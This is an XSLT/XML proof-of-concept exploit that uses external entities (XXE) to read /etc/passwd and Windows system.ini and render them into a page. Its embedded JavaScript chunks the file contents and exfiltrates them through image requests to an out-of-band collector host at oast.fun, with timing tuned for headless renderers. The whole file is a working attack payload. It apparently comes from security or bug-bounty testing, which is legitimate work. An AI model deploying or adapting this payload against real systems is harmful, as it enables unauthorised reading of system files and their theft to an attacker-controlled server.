<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="?#"?>
<!DOCTYPE div [
  <!ENTITY passwd_p        "file:///etc/passwd">
  <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
  <!ENTITY sysini_p        "file:///c:/windows/system.ini">
  <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
]>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/">
    <!-- keep your original flow -->
    <xsl:copy-of select="document('')"/>

    <body xmlns="http://www.w3.org/1999/xhtml">
      <div style="display:none">
        <p class="&passwd_p;">&passwd_c;</p>
        <p class="&sysini_p;">&sysini_c;</p>
      </div>

      <div style="width:40rem" id="r"></div>

      <script><![CDATA[
        // ----------------- helpers -----------------
        function urlEncodeUtf8(s) {
          // URL-encode (UTF-8) directly; no Base64
          return encodeURIComponent(s);
        }
        function chunkString(str, size) {
          const out = [];
          for (let i = 0; i < str.length; i += size) {
            out.push(str.slice(i, i + size));
          }
          return out;
        }
        const sleep = ms => new Promise(res => setTimeout(res, ms));

        // ----------------- render visible proof -----------------
        const r = document.querySelector('#r');
        r.innerHTML = `
remote web url:
<textarea style="width:100%;height:1.5rem">${location.href}</textarea><br/><br/>`;

        let raw = '';

        // Use textContent (not innerHTML) to avoid entity expansion issues
        const ps = document.querySelectorAll('p');
        ps.forEach(p => {
          const path = p.className;
          const data = p.textContent;

          r.innerHTML += `
local file path:
<textarea style="width:100%;height:1.5rem">${path}</textarea><br/>
local file content:
<textarea style="width:100%;height:60rem">${data}</textarea><br/><br/>`;

          raw += 'PATH:' + path + '\n' + 'DATA:' + data + '\n\n';
        });

        // If no <p> nodes were produced, nothing to exfil
        if (ps.length === 0) {
          r.innerHTML += `<div style="color:#b00">no entity data found</div>`;
        } else {
          // ----------------- URL-encode and chunk -----------------
          const encoded = urlEncodeUtf8(raw);
          const CHUNK_SIZE = 300;        // conservative chunk size
          const parts = chunkString(encoded, CHUNK_SIZE);
          const base = 'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/poc-exfil';

          // Start marker
          {
            const img = new Image();
            img.src = base + '?start=1&n=' + parts.length;
            document.body.appendChild(img);
          }

          // Throttled chunk send as query params
          (async () => {
            for (let i = 0; i < parts.length; i++) {
              const img = new Image();
              // d=<chunk> is already URL-encoded; we still encode once more to be safe
              img.src = base + '?i=' + i + '&n=' + parts.length + '&d=' + encodeURIComponent(parts[i]);
              document.body.appendChild(img);
              await sleep(80); // small delay improves reliability in headless mode
            }
            // End marker
            const end = new Image();
            end.src = base + '?end=1&n=' + parts.length;
            document.body.appendChild(end);

            // Give headless time to flush network requests before finalization
            await sleep(1000);
          })();
        }
      ]]></script>
    </body>
  </xsl:template>
</xsl:stylesheet>
